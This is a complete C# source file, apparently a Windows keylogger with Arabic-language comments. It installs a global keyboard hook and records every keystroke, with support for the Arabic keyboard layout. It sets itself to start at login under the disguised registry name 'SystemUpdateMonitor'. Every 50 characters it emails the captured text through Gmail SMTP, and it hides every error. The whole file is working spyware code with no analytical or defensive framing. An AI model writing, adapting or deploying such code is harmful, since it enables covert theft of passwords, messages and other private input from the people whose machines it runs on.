using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.Diagnostics;
using System.Net.Mail;
using System.Net;
using Microsoft.Win32;
using System.Text;

namespace KeyboardMonitor
{
    class Program
    {
        // 1. المتغيرات العامة
        private static string myEmail = "example@gmail.com";
        private static string myAppPassword = "----------------";
        private static int sendEveryXCharacters = 50;
        private static IntPtr _hookID = IntPtr.Zero;
        private static string interceptedData = "";
        private static int keyCounter = 0;

        // 2. نقطة انطلاق البرنامج
        static void Main(string[] args)
        {
            EnsureStartup();
            _hookID = SetHook(HookProcedure);
            Application.Run();
            UnhookWindowsHookEx(_hookID);
        }

        // 3. دالة التقاط المفاتيح
        private static IntPtr HookProcedure(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)0x0100)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                Keys key = (Keys)vkCode;

                if (key == Keys.Space) { interceptedData += " "; }
                else if (key == Keys.Enter) { interceptedData += Environment.NewLine; }
                else if (key == Keys.Back)
                {
                    if (interceptedData.Length > 0)
                        interceptedData = interceptedData.Remove(interceptedData.Length - 1);
                }
                else
                {
                    string character = GetCharsFromKeys(key, false);
                    interceptedData += character;
                }

                keyCounter++;
                if (keyCounter >= sendEveryXCharacters)
                {
                    SendLog();
                    interceptedData = "";
                    keyCounter = 0;
                }
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        // 4. دالة دعم اللغة العربية
        private static string GetCharsFromKeys(Keys keys, bool shift)
        {
            var buf = new StringBuilder(256);
            var keyboardState = new byte[256];
            if (shift) keyboardState[(int)Keys.ShiftKey] = 0xff;
            IntPtr layout = GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), IntPtr.Zero));
            ToUnicodeEx((uint)keys, 0, keyboardState, buf, 256, 0, layout);
            return buf.ToString();
        }

        // 5. دالة التشغيل التلقائي
        private static void EnsureStartup()
        {
            try
            {
                RegistryKey rk = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
                rk.SetValue("SystemUpdateMonitor", Application.ExecutablePath);
            }
            catch { }
        }

        // 6. دالة إرسال الإيميل
        private static void SendLog()
        {
            try
            {
                SmtpClient client = new SmtpClient("smtp.gmail.com", 587);
                client.EnableSsl = true;
                client.Credentials = new NetworkCredential(myEmail, myAppPassword);
                MailMessage mail = new MailMessage(myEmail, myEmail, "Log Report", interceptedData);
                client.Send(mail);
            }
            catch { }
        }

        // 7. محرك الـ Hook (SetHook)
        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(13, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        // 8. تعريفات نظام ويندوز (WinAPI)
        [DllImport("user32.dll")]
        private static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);

        [DllImport("user32.dll")]
        private static extern IntPtr GetKeyboardLayout(uint idThread);

        [DllImport("user32.dll")]
        private static extern uint GetWindowThreadProcessId(IntPtr hWnd, IntPtr lpdwProcessId);

        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll")]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
    }
}
